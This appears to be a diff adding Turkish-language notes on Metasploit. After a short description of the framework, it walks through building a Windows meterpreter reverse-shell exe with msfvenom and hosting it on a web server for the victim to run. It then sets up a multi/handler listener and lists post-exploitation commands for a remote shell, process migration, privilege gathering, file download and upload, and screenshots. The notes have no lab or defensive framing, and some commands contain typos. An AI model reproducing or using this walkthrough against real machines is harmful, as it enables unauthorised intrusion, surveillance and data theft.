@@ -1,0 +1,36 @@
+(+)Metasploit Nedir?(+)
+     Metasploit Projesi, (İngilizce: Metasploit Project) güvenlik açıkları hakkında bilgi sağlayan, sızma testleri (pentest) ve IDS imza gelişmesinde yardımcı olan bir framework projesidir.
+
+     Bunun en iyi bilinen alt projesi uzak hedef bilgisayara karşı şifreden yararlanmayı uygulamak ve geliştirmek için bir araç olan kaynağı açıkça belirtilmiş Metasploit taslağıdır. Diğer önemli alt projeleri işlemci kodu veri tabanını, shellcode arşivini ve ilgili araştırmayı içerir.
+
+     Metasploit projesi, bazıları Metasploit taslağının içine eklenmiş olan hukuka aykırı ve kaçınma araçları ile bilinir.
+     
+(+)Hedef Cihaza Sızma işlemi(+)
+    Hedef cihaza sızma işlemi 4 aşamadan oluşuyor.
+    1.Exploit
+    2.Payload
+    3.Exploit çalıştır.
+    4.Hedefi ele geçir.
+
+(+)Linux Metasploit çalışma (+)
+    "msfconsole" diyerek Metasploit başlatıyoruz.Daha sonra windows sisteme sızmak için bir exe oluşturuyouz.
+    (+)Eğer local host için exe oluşturacaksak aşağıdaki kodu yazmamız gerekiyor.
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST:10.0.2.10 LPORT=4444 -f exe> emre.exe"
+        Daha sonra oluşturduğumuz exe'yi /var/www/html klasörü altına yapıştrıyoruz.
+        "use multi/handler" diyerek multihandler tarafına geçiş yapıyouz.
+        "set payload windos/meterpreter/reverse_tcp" çalıştırarak payload set işlemi yapıyoruz.
+        "show options"
+        "set LHOST 10.0.2.10"
+        "set LPORT 4444"
+        Bundan sonra "exploit" diyerek karşı tarafın exe'yi çalıştırmasını bekliyoruz.
+
+(+) Sızma işlemiden sonra Yapılabilcek işlemler (+)
+    "execute -f cmd.exe -i -H:" veya "shell" diyerek karşı sistemde cmd çalıştabiliriz.
+    "ps" komutu ile karşı sistemde çalışan işlemleri görüntüleyebiliriz.
+    "run post/windows/manage/migrate" diyerek oluşturduğumuz exe yi başka bir çalışan işleme bulaştırmaya yarar.
+    "run post/windows/gather/win_privs" Karşı cihazdaki uid bilgilerine ulaşırız.
+    "download" komutu ile karşı cihazdaki istediğimiz bir dosyayı indirebiliriz.
+    "upload"  komutu ile karşı cihaza istediğimiz bir dosyayı yükleyebiliriz.
+    "screenshot" diyerek karşı cihaza ekran görüntüsü alabiliriz.
+
+    
